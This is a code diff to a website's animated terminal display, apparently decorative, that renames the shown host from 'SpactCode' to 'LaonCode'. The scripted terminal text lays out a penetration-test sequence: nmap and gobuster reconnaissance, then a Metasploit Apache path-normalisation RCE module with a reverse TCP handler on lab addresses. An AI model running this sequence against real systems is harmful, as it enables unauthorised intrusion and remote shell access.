@@ -49,7 +49,7 @@ if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
         var MAX_VISIBLE_LINES = 13;  // 뷰포트에 보이는 줄 수
 
         var script = [
-  { user: 'root', host: 'SpactCode', path: '~/recon', cmd: [
+  { user: 'root', host: 'LaonCode', path: '~/recon', cmd: [
       { t: 'nmap ', c: 'tk-cmd' },
       { t: '-sV -sC -p- ', c: 'tk-flag' },
       { t: '10.10.14.22', c: 'tk-string' }
@@ -59,7 +59,7 @@ if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
       { line: [{ t: '80/tcp open  http    Apache 2.4.41', c: 'tk-success' }] },
       { line: [{ t: 'Nmap done: 1 IP address scanned', c: 'tk-comment' }] }
     ] },
-  { user: 'root', host: 'SpactCode', path: '~/recon', cmd: [
+  { user: 'root', host: 'LaonCode', path: '~/recon', cmd: [
       { t: 'gobuster ', c: 'tk-cmd' },
       { t: 'dir -u ', c: 'tk-flag' },
       { t: 'http://10.10.14.22 ', c: 'tk-string' },
@@ -69,29 +69,29 @@ if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
       { line: [{ t: '/admin      (Status: 301)', c: 'tk-success' }] },
       { line: [{ t: '/uploads    (Status: 200)', c: 'tk-success' }] }
     ] },
-  { user: 'root', host: 'SpactCode', path: '~', cmd: [
+  { user: 'root', host: 'LaonCode', path: '~', cmd: [
       { t: 'msfconsole ', c: 'tk-cmd' },
       { t: '-q', c: 'tk-flag' }
     ] },
-  { user: 'msf6', host: 'SpactCode', path: 'exploit(...)', cmd: [
+  { user: 'msf6', host: 'LaonCode', path: 'exploit(...)', cmd: [
       { t: 'use ', c: 'tk-cmd' },
       { t: 'exploit/multi/http/apache_normalize_path_rce', c: 'tk-string' }
     ] },
-  { user: 'msf6', host: 'SpactCode', path: 'exploit(...)', cmd: [
+  { user: 'msf6', host: 'LaonCode', path: 'exploit(...)', cmd: [
       { t: 'set ', c: 'tk-cmd' },
       { t: 'RHOSTS ', c: 'tk-flag' },
       { t: '10.10.14.22', c: 'tk-num' }
     ], out: [
       { line: [{ t: 'RHOSTS => 10.10.14.22', c: 'tk-comment' }] }
     ] },
-  { user: 'msf6', host: 'SpactCode', path: 'exploit(...)', cmd: [
+  { user: 'msf6', host: 'LaonCode', path: 'exploit(...)', cmd: [
       { t: 'set ', c: 'tk-cmd' },
       { t: 'LHOST ', c: 'tk-flag' },
       { t: '10.10.14.5', c: 'tk-num' }
     ], out: [
       { line: [{ t: 'LHOST => 10.10.14.5', c: 'tk-comment' }] }
     ] },
-  { user: 'msf6', host: 'SpactCode', path: 'exploit(...)', cmd: [
+  { user: 'msf6', host: 'LaonCode', path: 'exploit(...)', cmd: [
       { t: 'run', c: 'tk-cmd' }
     ], out: [
       { line: [{ t: '[*] Started reverse TCP handler', c: 'tk-comment' }] },
@@ -102,7 +102,7 @@ if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
     ], out: [
       { line: [{ t: 'OS: Ubuntu 20.04 (Linux 5.4.0-x86_64)', c: 'tk-comment' }] }
     ] },
-  { user: 'root', host: 'SpactCode', path: '~/myTool', cmd: [
+  { user: 'root', host: 'LaonCode', path: '~/myTool', cmd: [
       { t: 'git ', c: 'tk-cmd' },
       { t: 'commit ', c: 'tk-arg' },
       { t: '-m ', c: 'tk-flag' },
